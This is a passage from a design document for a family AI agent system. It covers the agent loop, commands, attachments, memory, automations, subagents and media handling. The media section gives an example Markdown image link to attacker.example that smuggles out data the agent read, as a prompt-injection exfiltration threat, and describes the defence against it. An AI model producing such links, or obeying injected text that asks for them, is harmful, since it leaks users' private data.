    and a plan's replies (a Claude plan's thinking was signed for another account, and Codex keeps
    a ChatGPT plan's reasoning to itself). Anthropic accepts
    tool calls without thinking in the middle of a turn, so a switch can happen there.
  - Pictures and PDFs go along: btw keeps them and each provider gets its own copy (see
    [Attachments](#attachments)). Only those from before btw kept its own, stored as another
    provider's `file_id` (an `uploaded` source), become a note: this model can't open that copy,
    and the line before it (the attachment's label, or `Image: <path>` in a command result) says
    where the file is, so `btw view` shows it again. The switch dialog mentions them when the chat
    has any (`heldFileProviders`). A model on OpenRouter that can't see pictures or read PDFs gets
    the same kind of note for those it can't take (`readableMessages`).
- **The plans.** A plan's agent keeps its own copy of the chat, so a chat that comes back to a plan
  after another model answered starts a new session (on the Claude plan, a random id: the chat's
  own is taken) with the chat so far as a transcript, as a notification's chat does. So does one
  that moves from one plan to the other: the saved session says whose it is. Switching between
  presets of the same plan keeps the session, and the agent resumes it on the new model.

## Agent loop

This is a hand-written loop over the provider's streaming call (Anthropic's `messages.stream()`,
OpenAI's Responses API, OpenRouter's Chat Completions) rather than an SDK's tool runner, because
each step must be saved to SQLite and resumed from there, including after a gateway restart.

```
kick(conversation):                     one loop per conversation at a time
  loop:
    commit queued human messages        (assigns seq; this is how steering happens)
    if the last committed row isn't a user row: stop
    stream a model call → append an assistant row
    if it contains tool_use blocks:
      run them one after another (run_command, or a memory operation) → append one user row with
      every tool_result
      (if stop_reason isn't tool_use, the calls are answered with "not run" instead)
```

- **Stop** aborts the stream (the partial reply is dropped, nothing is appended) or kills the running
  command's process group. Unfinished calls are answered with `Stopped by <name>.` Queued messages
  are committed without calling the model, and the next message continues the conversation.
- **API errors** leave the transcript ending on a user row. The UI then shows a **Continue** button,
  which calls `kick` again.
- **Gateway restart:** an assistant `tool_use` with no result gets an appended "interrupted" result,
  and conversations with queued messages are started again.
- Several consecutive user rows (for example tool results followed by steering texts) are sent as
  separate messages. The API merges them into one turn.
- **Messages from the gateway** queue like a person's and join the transcript the same way: a
  background command's output (`task_result`) and, in a subagent's conversation, its task and steers
  (`agent_message`). Each one is plain user text with a bracketed first line saying where it comes
  from (`[Background command finished: …]`), not a mid-conversation system message: not every model
  takes those, and a command's output mustn't get system authority.

### `run_command`

- Input: `{summary, icon, command, cwd?, timeout_seconds?, run_in_background?}` (chats from before
  saved tools don't have `run_in_background`). Runs as `$SHELL -lc <command>`, so every
  call starts a fresh login shell and `cd` doesn't carry over between calls.
- `summary` (what the command does, in plain words and the conversation's language) and `icon` (a
  Lucide icon name) are only for the web UI, which shows them instead of the command. They come
  first in the schema so they stream in before the command. Required in the schema so the model
  always writes them, but a call without them still runs.
- Default timeout 120 s, maximum 1800 s. On timeout or Stop, the whole process group is killed.
  Background processes that a command detaches keep running.
- No stdin. `TERM=dumb`, `NO_COLOR=1`, `PAGER=cat`.
- Output is stdout and stderr interleaved, with ANSI codes removed, capped at 30 KB (the first 10 KB and
  the last 20 KB are kept), followed by an exit-code line. Images the command showed with `btw view`
  follow as image blocks (below).
- The environment is the gateway's own, minus its secrets (`ANTHROPIC_API_KEY`, `BETTER_AUTH_SECRET`, …),
  plus the `commandEnv` values from `config.json` (for example `FIRECRAWL_API_KEY`), plus
  `BTW_PROFILE`, `BTW_PROFILE_DIR`, `BTW_CONVERSATION_ID` and `BTW_VIEW_DIR`.
- `eager_input_streaming` is left off: the input is one short command, and leaving it off keeps the API's
  own input validation.

### Background commands

- With `run_in_background: true` the call is answered as soon as the shell starts: "Started in the
  background (process group N) …", with `kill -TERM -N` to stop it early. The agent keeps working
  or ends its turn.
- When the command ends, its output (capped like any command's, with the exit-code line) is queued
  in the conversation as a `task_result` message, `[Background command finished: <summary>]`, the
  command and the output, and the conversation is kicked: the agent reads it at its next step, or
  it starts a new turn. The chat shows it as a folded card.
- Default timeout 3600 s, maximum 86400 s. No `BTW_VIEW_DIR`, since nothing collects pictures from
  a command nobody waits for.
- The processes live in the gateway (`background.ts`); a `background_command` row per running one
  lets the next start queue "[Background command cut off …]" for commands a restart killed, so an
  agent waiting on one isn't left waiting.
- **Stop** in a chat also stops its background commands and its subagents (`stopConversation`), and
  nothing they would have handed over reaches the conversation. The chat lists what's still
  working in the background, with a Stop button that works while the agent itself is idle. A
  `btw agent watch` running there is the same work as the subagent it waits for, so the list shows
  only the subagent. Deleting a chat stops them first.

### Seeing images: `btw view`

The agent looks at an image by running `btw view <file>...`. There is no second tool: the images are
attached to that `run_command` call's `tool_result`, which may hold image blocks, so the tool
definition and every conversation's cache stay as they are. Like automations, nothing is added to
the system prompt beyond the skills catalog: the built-in `view-images` skill explains `btw view`,
and how to see what isn't a picture file yet (the screen, PDF pages, video frames, web pages),
crops for small print and contact sheets for many photos. A profile that turns the skill off
doesn't learn about `btw view`. Showing pictures to people is the other direction, in
[Pictures and files](#pictures-and-files).

- **Handoff.** Every call gets a fresh temp folder (`BTW_VIEW_DIR`) holding the conversation's
  remaining image allowance. `btw view` prepares each image, writes it there and adds a line to a
  manifest. After the command exits the gateway checks the files again, attaches them after the text
  output (each after an `Image: <path>` line), and deletes the folder. Not markers in stdout: output is
  cut at 30 KB, and `cat`-ing a file that contains one would attach an image nobody asked for.
- **Preparing** (`packages/core/src/images.ts`). JPEG, PNG, GIF and WebP up to 2000 px and 1.5 MB are
  sent as they are; JPEGs lose their EXIF and XMP segments (GPS positions, and an orientation that
  browsers apply but the model ignores). Everything else is converted with `sips` on macOS or
  ImageMagick elsewhere: at most 2000 px, turned upright, PNG when the source was PNG, GIF or WebP
  unless that's over 1.5 MB, otherwise JPEG. PDFs are refused.
- **Why 2000 px**, although newer models take 2576: a request with more than 20 images, the history
  included, rejects any image over 2000 px. History is never edited, so a larger image would break
  the conversation for good once it holds 21.
- **Limits.** 10 images per command, and 100 per conversation counting attached pictures (the API's
  limit on 200k-context models, and every request carries the whole history). Past a limit
  `btw view` fails with an explanation; nothing is dropped silently.
- **Uploaded, not inline.** The gateway uploads each image through the Files API (see
  [Attachments](#attachments)) and the `tool_results` row refers to it by `file_id`, so the history
  doesn't resend the bytes. Only if the upload fails does the image go inline as base64, and the
  conversation's inline images are capped at 20 MB, since a request is capped at 32 MB.

## Attachments

People attach files in the composer: the paperclip button, pasting, or dropping them on it. Any
kind of file, up to 100 MB each (the same as pictures in replies) and 10 per message.

- **Uploaded when attached.** Each file streams to `POST /api/p/<profile>/uploads` as soon as it's
  added, into the media store, with an `upload` row. Sending the message then carries only the
  upload ids, and only the person who attached a file can send it. Uploads never sent are dropped
  after a day. `btw start` raises adapter-node's 512 KB body limit for this; `hooks.server.ts`
  keeps a 1 MB limit on every other route, including the public ones that read a body first.
- **Saved for the agent.** On send, each file is copied into `profiles/<slug>/attachments/` under
  its own name (`name (2).ext` when another file has it), gets a media row so the chat shows it (see [Pictures and files](#pictures-and-files)), and the message's content gets, per file, a line saying who
  attached it and where it was saved, then the file itself when the model can have it:
  - **pictures** go through `prepareImage` (converted, at most 2000 px, upright) and become an
    `image` block referring to those bytes, kept in the media store;
  - **PDFs** become a `pdf` block referring to the file, after a free `count_tokens` call that
    checks the model can read it and says what it costs;
  - **other files**, text included, are only named, and the agent opens them with commands.
- **Limits, because history is never edited.** A file the API refuses would fail every later
  request, so pictures count against the 100 per conversation, and a conversation's PDFs share
  25% of the model's context window (about 250k tokens on 1M-context models, 50k on 200k ones;
  well under the API's 600 and 100 pages). A PDF over the rest of that budget, or one
  `count_tokens` rejects, is sent as its path with the reason in its line, and the chat shows the
  same note under the file.
- **By reference.** A message keeps a picture or PDF as a `media` source: the SHA-256 of the
  bytes the model gets (a converted picture's own), which the media store keeps while a message
  refers to it. Before each model call, `resolveFiles` (`provider-files.ts`) gives the provider its
  copy: the Files API's `file_id`, or the bytes inline for the Claude plan. So a chat that
  switches providers takes its pictures along, and the first call on the new one uploads them.
  The same rows always give the same request. An upload that fails at that point fails the call
  (Continue tries again), never falling back to base64, which would change the prefix later.
- **Files API.** Uploaded once per content and account, and first when the file is attached, so
  a problem shows then: `provider_file` maps provider, a hash of the API key (files live in its
  workspace) and the content's SHA-256 to the `file_id`. Requests stay small whatever the history
  holds, and a reference is part of the cached prefix like any other block. When attached, a
  cached id is checked (one metadata request) and the file uploaded again if it's gone; later
  requests take the cached copy as it is, since checking every picture would cost a request
  apiece. The hourly prune deletes files no message refers to any more (by id, or by what it's a
  copy of), leaving those used in the last hour and those in another key's workspace alone. With
  another workspace's key, a chat's pictures are uploaded again, at the cost of one cache miss.
  The Files API isn't eligible for zero data retention. Pictures and PDFs from before btw kept
  its own copies are stored with the provider's `file_id` and can't move to another provider or
  workspace.
- **Other providers.** `message.attachments` is the provider-neutral record (saved path, type,
  what the model got). `content` holds btw's blocks (see [btw's format](#btws-format)), and each
  provider's module turns them into its request. A provider brings a `FileStore`
  (`provider-files.ts`); one without a files API sends pictures inline (PDFs too on the Claude
  plan, and as their path on the ChatGPT plan). OpenAI's is its
  Files API: pictures are uploaded for `vision` and PDFs as `user_data`, and a PDF's cost is
  counted with `POST /v1/responses/input_tokens`, which also fails for a PDF it can't read.
- **OpenRouter's** is its Files API (in beta), which takes pictures and PDFs alike and keeps them
  in the key's workspace without expiring. It answers OpenAI's SDK in OpenAI's shape, missing
  files included, so its store is OpenAI's on OpenRouter's client. It can't count a PDF's tokens,
  so they're estimated from its pages as on the Claude plan, before it's uploaded. Unlike
  Anthropic's and OpenAI's, many of its models are text only, and a picture sent to one would
  fail every later request. So `modelInputs` asks OpenRouter's model list first (`image` and
  `file` among its `input_modalities`): a picture goes only to a model that sees pictures, and a
  PDF only to one that reads PDFs itself, since for the others OpenRouter would run it through a
  paid OCR service at every request, each one carrying the whole history. Otherwise the file goes
  as its path with the reason (`… can't see pictures`), and `btw view` says the same in the
  command's result. When the list can't be read, the file goes as its path too.

## Memory

Each profile's memory is a folder of short Markdown notes, `~/.btw-agent/profiles/<slug>/memories`,
one per topic (`family.md`, `people/anna.md`). There is no memory tool: like automations and
`btw view`, it is files plus a CLI command, so it works the same with any model provider.

- **In the prompt:** a short Memory section that names the notes as they were when the
  conversation started (`Notes when this conversation started: family, food, people/anna.`), says
  how to read and save them, and what is worth saving. Only names, never facts, so the prompt
  changes when a note is added or removed and not with every fact, and nothing is read until the
  agent needs it: before answering, it reads the notes that could matter
  (`btw memory show family food`).
- **Pinned core note.** `core.md` is the exception: a copy of it, as it is when the conversation
  starts (or its prompt is built again), goes whole into the Memory section. It is for what matters
  in almost every chat (who is in the family, languages, allergies, standing preferences, whatever
  someone asks btw to always keep in mind), and holds at most 4,000 characters: `btw memory` and
  the page refuse more, and one made longer in an editor is cut at a line in the prompt, with a
  note telling the agent to read the rest and move it out. The list of other notes leaves it out.
- **`btw memory`** (`packages/cli/src/memory.ts`, on top of `packages/core/src/memory.ts`): `list`,
  `show <topic>...`, `add <topic> <fact>` (one bullet; creates the note, skips a fact it already
  has), `replace <topic> <old> <new>` (text that appears exactly once), `forget <topic> <text>` (the
  one line containing it), `write <topic>` (the whole note, from stdin), `rm` and `mv`. Topics are
  paths inside the folder; `..`, names starting with a dot and symbolic links are refused. Notes are
  written atomically and hold at most 50,000 characters. The agent can also edit the files
  directly; `btw memory` is preferred because it dates each fact.
- **What goes in:** one fact per bullet, updated rather than repeated. Secrets such as passwords
  and door codes are allowed when someone asks: a profile is only shared by people who trust each
  other, and models tend to refuse them in memory unless told so. The exception is something one
  member wants kept from the others (a surprise), since every member can read the memory.
- **Older conversations** keep their frozen prompt, which has the old `MEMORY.md` pasted in.
  Whenever a `MEMORY.md` shows up in the profile folder (the old file on the first use, or one an
  older chat writes later), it is moved into the folder as `general.md` (or `general-2.md`, …).
- **Fact dates.** Every list item, paragraph or table row in a note is a fact, and a hidden
  `.facts.json` in the folder records when each was first seen (matched by its words, ignoring
  case and spacing). `btw memory` and the page update it with each change; facts that reached the
  files some other way are dated by their file's modification time, and whatever was in memory
  before dates were kept has none. A fact that moves to another file, or leaves one and comes
  back, keeps its date. Names starting with a dot are reserved, so `btw memory` can't touch it.
- **Imported** from another assistant on a new profile's welcome, dated as that assistant
  remembered them: see [Welcome](#welcome).
- **Memory page** (`/p/<slug>/memory`): a grid of dots, one row per note and one dot per fact,
  oldest on the left. A dot's shade is its age: black today (with a halo), fading to light grey
  over about three months, and lightest when undated. Rows are ordered by the latest change, notes
  in a folder are grouped under its name, and past 12 rows the rest fold away. Pointing at (or
  tapping) a dot shows the fact and when it was learned. Below the grid, every note is rendered as
  Markdown and can be edited or forgotten. The core note comes first, marked as pinned, even before
  it exists, so people can start it there; its editor counts characters against the limit. An edit
  is refused if the agent changed the note after it was opened; saving again then replaces the
  agent's version.

## Soul

Each profile can give btw a soul, like [SOUL.md](https://soul.md): who it is for this family (its
character, values, tone and boundaries) rather than facts about them, which go into memory. It is
`~/.btw-agent/profiles/<slug>/soul.md`, trimmed, at most 4,000 characters
(`packages/core/src/soul.ts`).

- **In the prompt:** a "Your soul" section right after the first line, with the text in
  `<soul>…</soul>`, so it frames everything after it; the rest of the prompt still applies.
  Without one, the section says there is none yet and how to start it. A file made longer in an
  editor is cut at a line, with a note to shorten it.
- **Changes reach open chats:** each conversation keeps the soul its prompt was built with
  (`conversation.soul`). At the start of a turn (never in the middle of one), if the profile's soul
  differs, the prompt is built again, like when the folder changes (`withCurrentContext` in
  `runner.ts`, one cache miss). Chats from before souls existed have `''`, so they are left alone
  until a profile gets one.
- **Who changes it:** the family, in the Soul box of the profile's settings (People & profile), and
  the agent itself: the prompt tells it the soul is its to shape when someone asks it to be
  different, to write the whole new text with `btw soul write` (stdin), and to say what it
  changed. `btw soul` prints it and `btw soul rm` removes it.

## Folders

Folders group a profile's chats, like projects in ChatGPT: the chats in a folder share its
context, which the family sets on the folder's page (`/p/<slug>/f/<id>`).

- **What a folder has:** a name, instructions (up to 8,000 characters) and up to 50 files. Files
  are uploaded like the composer's attachments, copied into `profiles/<slug>/folders/<folder>/`
  (the folder's slug is fixed when it's made, like a profile's) and kept in the media store for
  the page, which shows pictures and serves downloads from there, never from the copy.
- **In the prompt:** a `# Folder` section at the end of the system prompt, after the skills, so
  everything before it is the same as in the profile's other chats: the folder's name, its
  instructions, and one line per file with its path, type and size. Pictures and documents are
  not attached; the agent opens the ones that matter with commands and `btw view`. A folder with
  many files costs a few lines per chat, and nothing counts against the conversation's picture
  and PDF limits.
- **Starting in a folder:** the composer on the folder's page, or the folder chip in the new
  chat composer (`?folder=<id>` preselects it), whose menu also makes a new folder.
- **Moving chats:** drag a chat onto a folder in the sidebar (its row, or its chats when it's
  open), or onto the Chats list to take it out; or use "Move to folder" in a chat's menu (the
  sidebar's or the chat header's). Moving only sets `conversation.folder_id`.
- **Dragging** (`src/lib/chat-drag.svelte.ts`) uses pointer events for a mouse or pen and touch
  events for fingers, not the browser's drag and drop, so it works the same on phones. A mouse
  drags after moving 4px; a finger after a 400 ms long press, and moving earlier scrolls the list
  as usual. The row only moves up and down and stays inside the sidebar's list, which scrolls
  near its edges. The chat leaves its place, and the group under it opens a gap where it will
  land: groups are ordered by recent activity, so that's its place in that order, not wherever
  the pointer is. Holding it over a closed folder for a moment opens the folder; dropping on a
  closed folder's row slides the chat into it. Escape puts it back. On touch screens a blocking
  `touchmove` listener sits on the list from the start (the browser only waits for listeners
  that were there when the touch began), and stops the scrolling once a chat is picked up.
- **The prompt follows the folder.** Each conversation stores the folder section its prompt was
  built with (`folder_context`). At the start of every model call the runner renders the section
  the chat should have now (its folder's current name, instructions and files, or nothing) and,
  if it differs, builds the whole system prompt again, so moving a chat, and editing a folder's
  instructions or files, reaches its chats at their next message. Several edits between two
  messages cost one rebuild. It waits while a turn is in progress (the last reply called a
  command): the model is still working under the prompt it started with.
- **What a rebuild costs.** The system prompt is the start of the cached prefix, so the next call
  reads the whole conversation again once (the chat marks it as a cache miss). It also
  invalidates the thinking in earlier replies: a thinking block's signature records the prompt
  it was made under, and Opus 5.5 and Fable 5.1 refuse it under another one (a 400 on accounts
  created since 2026-08-31, and silently accepted on older ones). So the conversation remembers
  its last row before the rebuild (`prompt_changed_at_seq`), and every later call sends the
  replies up to it without their `thinking` and `redacted_thinking` blocks. Those are the oldest
  blocks in the conversation, which the API allows to be left out, and they're left out the same
  way on every call, so the prefix is stable again after the one miss. The stored rows stay as
  they are.
- **Deleting a folder** moves its chats back to the Chats list (their prompts lose the folder at
  their next message) and its files to `~/.btw-agent/trash/`. Removing one file deletes its copy
  unless it changed since it was added.

## Making pictures

The agent makes pictures with `btw generate image`, a command like `btw view`: no new tool, nothing
in the system prompt beyond the skills catalog. The built-in `generate-images` skill explains it,
how to write prompts, and how to run the Images page's messages.

- **Providers** (`packages/core/src/image-generation.ts`). Models are named `<provider>/<model>`
  (`openai/gpt-image-2.5-flare`, the default; `btw config set image-model`). Each provider is one
  module with the same shape, registered in `PROVIDERS`: its key check, its qualities, how many
  input pictures it takes and which formats, and `generate`. `openai.ts` is the only one today:
  `/v1/images/generations` for a prompt, `/v1/images/edits` (multipart) when pictures are given,
  with plain `fetch` rather than the SDK. OpenRouter, fal or Higgsfield would each add a module;
  shapes (`square`, `portrait`, `landscape`, `auto`) are provider-neutral and each module maps them
  to its own sizes.
- **Keys** live in `config.json` (`btw key set openai` or Models & keys), with `OPENAI_API_KEY` as a
  fallback, and are read by the CLI, so the gateway itself never calls the image API.
  `OPENAI_BASE_URL` points it at a proxy or a compatible server, as in OpenAI's SDKs.
- **Input pictures.** PNG, JPEG and WebP are sent as they are (JPEGs without EXIF, which carries GPS
  positions); other formats, sideways photos and files over 25 MB go through `btw view`'s converter.
- **Output** goes to the profile's `images/` folder (or `--out`), and the command prints a `Saved
<path>` line per picture, which the agent shows with `![...](path)` like any other picture.
- It checks everything (key, options, input files) before saying it has started, and a request
  times out after 5 minutes; the skill tells the agent to allow 300 s.

### Templates and the Images page

The Images page (sidebar, `/p/<slug>/images`) is one grid of templates, like ChatGPT's; tabs
appear only when templates name more than one category. Opening one shows a sheet (from the
bottom on phones): its picture, title and description, and what to do next, which depends on the
template.

- **The sheet's buttons** depend on where the picture comes from: "Take a photo" (phones) and
  "Choose a photo" for templates that start from a photo, "Start drawing" and "Use a photo of a
  drawing" for those that start from a drawing, and "Try it" for the rest. Templates without
  settings start the chat as soon as the picture has uploaded; there is nothing to fill in.
- **Templates with settings** go on to a sentence with a chip for each: "Make a [watercolor ⌃]
  storybook page where the kid in [🖼 ⌃] [rides a dragon to school]." A choice is a chip that opens a
  menu of the others (bits-ui's Select); where the template allows it (every Style and Theme), the
  menu ends with "Custom…", which turns the chip into a field for the person's own choice, with ⌃
  back to the list. Free text is an inline field, emoji are a chip that opens an emoji picker, and
  the picture is a chip that picks another (for drawing templates, a menu: draw, or choose a photo
  of a drawing). Punctuation right after a chip stays on its line, and "a" before one becomes "an"
  when the choice starts with a vowel sound ("an origami sticker pack"), on the page and in the
  message. Anything typed below the sentence is added to the prompt, and the shape is a chip next to
  Generate.
- **The emoji picker** is [emoji-picker-element](https://github.com/nolanlawson/emoji-picker-element)
  (search, categories, skin tones), in a popover under the chip: taps add emoji up to the
  setting's `max`, one more pushes out the oldest, and ⌫ removes the last. Its data
  (`emoji-picker-element-data`) is bundled and served by btw rather than fetched from a CDN, and
  the picker keeps it in IndexedDB after the first open. It's styled with btw's colors in both
  themes.
- **Drawing** is a full-screen canvas: pen with a size slider, eraser, colors, undo. It keeps the
  strokes as fractions of the side, so it survives resizing, and ✓ exports a 1024×1024 PNG that
  is attached like a photo.

Generate starts a new chat (default model, reasoning `low`) whose first message holds the picture
and the finished prompt; the model names the chat as usual. A text box below the grid ("Describe
an image", with the chat's paperclip) does the same with the person's own words.

- **A template** is a folder with a `TEMPLATE.md`: YAML frontmatter (name for its card, `title` for
  its sheet, description, category, a Lucide `icon` and hex `color`, whether it needs a picture and
  whether that's a photo or a drawing (`image-source`), the default shape, its settings: `options`
  with a label and the `prompt` fragment each stands for (`custom: true` also takes a typed choice
  as it is, `custom: 'Style: {{style}}.'` says how it's worded, and typed text that matches a label
  is that option), free text, or `type: emoji` with a `max` (up to 4 by default), picked with a real
  emoji picker, and the `sentence` that shows them as chips), then the prompt: the instructions for
  the image model. `{{setting}}` is replaced by the choice, `{{#setting}}…{{/setting}}` is kept only
  when it has a value and `{{^setting}}…{{/setting}}` only when it doesn't; `{{image}}` is "the
  attached picture" when one was given, and `{{aspect}}` the chosen shape in words ("square (1:1)",
  empty for auto). A prompt that uses `{{aspect}}` says the shape where it wants ("a single
  {{aspect}} transparent sticker sheet"); others get "Make it square (1:1)." at the end. Options
  whose labels have no letters are their own value. A line that held only sections left out
  disappears. A square `cover.png|jpg|webp` next to it replaces the icon; the card's title sits over
  its bottom fifth. The built-in covers were made with the image model and shrunk to 768px WebP.
- **Sources**, like skills: the 19 that ship with btw (`packages/core/image-templates`),
  `~/.btw-agent/image-templates`, and the profile's `image-templates` folder; a later one
  overrides an earlier one with the same id.
- **Applying a template just sends a prompt.** The message is the finished prompt, as the family
  reads it in the chat: the sentence with the choices' labels, the instructions with the
  choices' prompts, the shape in words, and what the person typed.

  ```
  Make a watercolor storybook page where the kid in the attached picture rides a dragon to school.

  A full-page children's picture-book illustration of the adventure.
  …
  Make it portrait (2:3).

  Give the dragon a backpack.
  ```

  The skill tells the agent to pass a detailed prompt like this unchanged on stdin (a heredoc,
  so quotes can't break the command), to turn "square (1:1)", "portrait (2:3)", "landscape
  (3:2)" and "transparent background" into flags, and to pass the attached pictures as
  `--image`. Templates are only the page's business: `btw generate image` takes a prompt and
  pictures, whoever wrote them.

- **Pictures** go through the chat's attachments: they upload as soon as they're picked, and the
  message carries their ids, so the model sees each one with the path it was saved at in
  `attachments/` (see [Attachments](#attachments)); the skill passes that path as `--image`.
  Templates take only pictures.

## Automations

Triggers run the agent without anyone sending a message. What they find goes to notifications, not
into conversations.

- **Trigger** (per profile). _When_: a 5-field cron expression in the gateway's local time zone, a
  one-time `runAt`, or a webhook: `POST /api/hooks/<secret token>` with a JSON body (64 KB max;
  SvelteKit's cross-site check refuses form-encoded and text/plain bodies in production). _What_:
  a prompt for the agent, or a shell command that runs without the model. Script triggers make
  polling cheap: the script checks the email, the price or the page, and runs
  `btw wake "<what happened>"` only when the agent is needed.
- **Who sets them up:** the agent, with the `btw trigger` command. There is no new tool and nothing
  in the system prompt beyond the skills catalog: the built-in `automations` skill explains
  `btw trigger` and `btw wake`, and is read only when someone asks for a reminder or a check. Members
  see, edit, run, pause and delete them on the profile's Automations page. There is no create form.
- **The Automations page** is for the family, not the agent. Each trigger shows its `icon` and a
  one-sentence `summary` (written by the agent with `--summary` / `--icon`, like `run_command`'s),
  its schedule in plain words (`describeCron`: "Every weekday at 07:30"; the cron itself only with
  technical details on) and relative times ("next Monday at 07:30"). The prompt, script and webhook
  URL are behind Edit. Above the list, a month calendar (whole weeks, Monday first, `?month=`
  to page) shows an icon per trigger on each day and the chosen day's list below it: before now,
  what ran and how it went (agent runs, and failed scripts once a day; runs are kept 30 days, so
  it goes back no further), after now, what the schedule will run. A trigger firing more than 4
  times a day on average is listed once above the grid instead.
- **Runs.** Every firing (schedule, webhook, `btw wake`, Run now) inserts a `pending` row in
  `trigger_run`. The gateway's scheduler ticks every 5 s: it fires triggers whose `nextRunAt` has
  passed and starts pending runs. The CLI only writes rows, so `btw wake` from a script is picked up
  within a tick. At most 3 agent runs go at once, a script trigger runs one at a time, and a
  scheduled firing is skipped while the trigger's previous run of the same kind is unfinished.
- **Missed firings** (Mac asleep, gateway down) collapse into one catch-up run, because the next time
  is computed from when the trigger actually fired.
- **Agent runs** happen in a hidden conversation (`conversation.hidden`) through the normal runner.
  Its first row has kind `trigger`: the model sees `[Automation "<name>" · <why> · <time>]`, the
  prompt, the webhook body, and instructions to keep the final reply short or answer only
  `NO_NOTIFICATION`. The system prompt is the ordinary one, so runs share the profile's cached prefix.
- **Finishing.** When a run's loop ends (`onLoopEnd`): an API error becomes an error notification, a
  final reply becomes a notification with that text, `NO_NOTIFICATION` on the last line (or no text)
  is recorded as `silent`, and a run someone stopped is `stopped`. None of these notify twice.
- **Script runs** execute like `run_command` (login shell, profile folder, the same environment plus
  `BTW_TRIGGER_ID` and `BTW_PAYLOAD`) with a 10-minute timeout, keeping the last 4 KB of output. A
  failing script notifies once, when it starts failing, not on every run.
- **Notifications** belong to the profile, like conversations. Dismissing is per person
  (`notification_dismissal`), and unread means newer than when that person last opened the menu
  (`notification_seen`). Pages listen on `/api/events` (SSE), which also carries profile renames and
  avatar changes, and reload the bell on change.
- **Continue in chat** unhides the run's conversation, which moves into the sidebar with its whole
  transcript; sending a message into a hidden run does the same. A notification without a
  conversation (script failures, or the run was deleted) starts a new conversation whose first
  reply is the notification text.
- **After a restart**, agent runs that were in progress continue (the interrupted command gets the
  usual "restarted" result) and script runs in progress are marked failed.
- **Retention:** finished runs, notifications and hidden conversations are deleted after 30 days, and
  only the last 100 runs of each trigger are kept.

## Subagents

A subagent is another agent that a chat's agent starts to work on a task in the background: big
jobs that would fill the chat with reading (research across many pages, going through a folder
of documents), several independent jobs at once, or long ones the agent shouldn't sit in. Like
automations, it's a CLI command and a built-in skill (`subagents`), not a tool.

- **`btw agent run [<id>] --prompt "<task>"`** (`--prompt -` reads stdin) writes a `subagent` row
  and a hidden conversation for it, whose first message is the task, queued as an `agent_message`
  with a note saying it's a subagent, nobody can answer questions, and its last message is its
  result. It returns at once with the id (`agent-1`, `agent-2`, … or one the agent gives), the log
  path, and how to hear back. Given the id of one that finished, it queues more work in the same
  conversation instead. At most 5 work at once per chat, and subagents can't start subagents.
- **It doesn't inherit the chat.** Its conversation has a system prompt built for it from the
  profile as it is now (skills, memory notes, and the chat's folder if it's in one), the current
  tools, and a 5-minute cache. Nothing of the parent's transcript comes along: the prompt must say
  everything it needs.
- **Model and reasoning:** the chat's, unless `--preset <name|id>` (resolved like
  `btw wake --preset`) or `--effort <level>` say otherwise. The skill tells the agent to run
  `btw preset list` and pick a name from it, never to make one up, and suggests a smaller model and
  `low` for simple reading-heavy jobs. More work may come with another `--preset` or `--effort`,
  which switch the subagent's conversation as in a chat (one cache rebuild).
- **The gateway runs it** (`subagent-host.ts`), like `btw wake`: the CLI only writes rows, and the
  scheduler (every tick, and right after each of the agent's commands) starts `pending` subagents
  through the normal runner. When its loop ends it is `done`, `failed` or `stopped`; one still
  waiting for its own background commands stays `running` until they end.
- **`btw agent watch <id>`** polls until its current work has ended and prints its last message
  (exit 1 with the reason if it failed or was stopped). The agent runs it with
  `run_in_background`, so the result arrives as a background command's output: the agent can do
  other work or end its turn meanwhile, and hears back as a message.
- **`btw agent steer <id> --prompt "…"`** queues a message the subagent reads at its next step,
  and marks it `pending` so the gateway starts it if it was waiting. A steer and the end of a loop
  can't miss each other: both check the other side in a transaction, and a loop that ends with a
  message queued starts again.
- **The log** (`profiles/<slug>/agents/<chat>/<id>.log`) gets every row the subagent's
  conversation commits, as the gateway's runner emits it: messages from the agent that started it,
  what it wrote, the commands it ran and the start of their output. Never its reasoning. The agent
  reads it with `tail` when someone asks how it's going.
- `btw agent stop <id>` asks the gateway to stop it; `btw agent list` shows the chat's subagents.
- **In the web UI** a subagent's chat opens from the chat's background list and has no composer:
  only the agent that started it writes there, though people can Stop it. Its banner links back.
- After a restart, subagents that were working start again (their interrupted commands get the
  usual result). A deleted chat takes its subagents' conversations with it; subagents are hidden
  conversations, so they're also deleted after 30 idle days.

## Pictures and files

The agent shows a picture by writing a Markdown image, `![what it shows](path)`, and hands over a
file by linking it, `[Tax form](path)`. The system prompt explains this (so only conversations
created since know it). There is no new tool and the reply's `content` is never touched, so the
cached prefix doesn't change.

- **What counts** (`@btw/core/media-refs`): images whose target is a path on the computer (absolute,
  `~/…`, relative to the profile folder, or `file://`) or an http(s) URL, and links whose target is
  a path. Links to web pages stay links. It reads the text with marked's lexer, so code spans and
  code blocks are skipped, and the browser renders with the same file, so both agree.
- **Copied when the reply is saved.** After a model call, before appending its row, the runner copies
  every target into `~/.btw-agent/media/<sha256>` in its original size and bytes (remote pictures are
  downloaded, with a 30 s timeout), then appends the row and one `media` row per target in the same
  transaction. The chat keeps showing a picture after the original is moved, edited or was a
  temporary file, and background runs nobody opens for days keep theirs. The streamed reply stays
  on screen meanwhile; Stop aborts the copying.
- **Web pictures only from links the agent found.** The gateway downloads them itself, so without
  a rule a reply containing `![x](https://attacker.example/p.png?d=<something the agent read>)`
  would hand that data to the attacker as soon as it's saved, and a prompt injection would only
  have to get the model to write a picture, a lower bar than getting it to run `curl`. So a web
  picture is downloaded only if its exact link appears earlier in the conversation, in what a
  person wrote, an automation's prompt or event, or a command's output: the agent found the link
  rather than built it (the rule of Anthropic's web fetch tool). The agent's own replies and
  commands don't count; the match must be the whole link, not the start of a longer one; `&amp;`
  and `\/` read as `&` and `/`, so links copied out of HTML and JSON match. Otherwise the row says
  "Web pictures are shown only when btw found the link on a page or in a message", and the system
  prompt tells the agent to download other pictures and show the file. This narrows the channel
  rather than closing it: a reply can still choose which of the links it found to show, and a
  command can print any link, but an agent that runs commands can already send anything with
  `curl`.
- **Never from this computer or the local network.** Downloads use Node's `http`/`https` with a
  DNS lookup that refuses loopback, private, shared (CGNAT, Tailscale), link-local, multicast and
  reserved addresses, and this computer's own addresses. Node calls it for each connection, so the
  address checked is the one connected to (a name can't resolve to a public address for the check
  and a local one for the connection). IP addresses in a link are checked before connecting, and
  each redirect (up to 5) goes through the same checks.
- **Limits:** 100 MB per file, 30 per reply. `config.json` and the database are never copied. A
  target that can't be copied gets a row with the reason in plain words (not found, a folder, too
  large, not a picture, a web link the agent didn't find, a local-network address, the download
  failed), which the chat shows in its place.
- **Types come from the content.** A picture is never recognized by its extension. HEIC and TIFF
  (and camera RAW files) also get a full-size JPEG copy for display, made with macOS's `sips`; the
